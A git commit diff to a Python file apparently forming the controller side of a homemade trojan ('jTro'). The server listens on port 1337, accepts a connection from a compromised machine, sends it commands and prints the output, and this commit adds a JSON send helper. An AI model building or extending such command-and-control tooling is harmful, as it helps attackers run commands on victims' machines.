5bc56ba50f580c4843b66f78dc8f1631597d6858
jakiiii <me.jaki@outlook.com>
2019-02-14 13:27:30 +0600

    create function reliable_send

--- jtro_server.py
+++ jtro_server.py
@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 import socket
+import json
 
 
-class Listener:
+class JTServer:
     def __init__(self, ip, port):
         lst = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         lst.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -11,6 +12,10 @@ class Listener:
         print("[+] Waiting for incoming connection.")
         self.c, a = lst.accept()
         print("[+] Connection established from " + str(a))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.c.send(json_data.encode('utf-8'))
 
     def execute(self, cmd):
         self.c.send(cmd.encode('utf-8'))
@@ -23,5 +28,5 @@ class Listener:
             print(res)
 
 
-jTro_Listener = Listener("192.168.31.207", 1337)
-jTro_Listener.run()
+jTro_server = JTServer("192.168.31.207", 1337)
+jTro_server.run()
